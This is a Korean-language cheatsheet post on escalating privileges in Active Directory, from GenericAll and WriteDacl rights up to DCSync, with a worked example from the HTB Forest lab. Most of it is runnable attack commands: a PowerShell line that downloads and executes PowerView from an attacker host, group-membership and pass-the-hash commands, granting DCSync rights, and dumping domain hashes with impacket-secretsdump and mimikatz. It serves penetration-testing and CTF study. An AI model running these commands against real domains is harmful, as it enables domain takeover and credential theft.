---
title: "How to abuse GenericAll / WriteDacl permission on Active Directory"
date: 2025-10-03
categories: [cheatsheet]
tags: [AD, bloodhound, permission]
---

![1](/assets/images/cheatsheet/abuse_dacl/스크린샷%202025-10-04%20오후%202.59.57.png)

상황 예시: BloodHound에서 GenericAll → target group, 그 그룹이 WriteDACL 권한을 도메인에 가지고 있어 DCSync 권한 부여로 이어지는 체인.

> 메모: PowerView in-memory 로드
```
# 공격자(예: Kali)에서 python3 -m http.server 8000 실행 후, 타겟에서 직접 로드
IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.8:8000/PowerView.ps1')
```

## GenericAll abuse

#### Linux (Samba / rpc 모듈 사용)

목적: GenericAll 권한을 이용해 대상 그룹에 사용자 추가
```
# 일반 계정/비밀번호 사용
net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

# Pass-the-hash (LM:NT 해시) 사용 예시 (pth-net 포함)
pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```

확인
```
net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
```

PoC
![2](/assets/images/cheatsheet/abuse_dacl/스크린샷%202025-10-04%20오후%203.41.26.png)

#### Windows (PowerView)

Credential 생성
```
$SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
```

그룹 멤버 추가
```
Add-DomainGroupMember -Identity 'target_group' -Members 'target_member' -Credential $Cred
```

확인
```
Get-DomainGroupMember -Identity 'target_group'
```

실제 예 (htb forest machine 풀이 중)
```
$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $SecPassword)

# 이미 svc-alfresco로 로그인한 세션이면 Credential 생략 가능
Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco' -Credential $Cred

Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'
```

![4](/assets/images/cheatsheet/abuse_dacl/스크린샷%202025-10-04%20오후%203.50.08.png)

## WriteDacl abuse

#### Linux (impacket)

impacket-dacledit 를 이용해 도메인 오브젝트의 DACL을 수정하여 DCSync 권한 부여
```
impacket-dacledit -action 'write' -rights 'DCSync' -principal 'target_user' -target-dn 'DN' domain/'user':'pass'
```

#### Windows (PowerView)

Credential 준비
```
$SecPassword = ConvertTo-SecureString 'Password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\user', $SecPassword)
```

도메인 오브젝트의 DACL에 DCSync 권한 추가
```
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'target_user' --TargetIdentity 'domainDN' -Rights DCSync
```

원라인 스크립트 예시
```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco';
Start-Sleep -Seconds 2;
$Sec = ConvertTo-SecureString 's3rvice' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $Sec);
Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'HTB\svc-alfresco' -TargetIdentity 'DC=htb,DC=local' -Rights DCSync
```

Add-DomainObjectAcl 사용 시 -PrincipalIdentity로 유저를 지정해야 정상 동작.

-TargetIdentity는 도메인명 문자열이 아닌 DN(DC=htb,DC=local) 형식으로 지정해야 정상 동작.

## DCSync
#### Linux
```
impacket-secretsdump domain/user:pass@target_ip
```
#### Windows
mimikatz.exe 사용
```
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:htb.local /user:Administrator
```
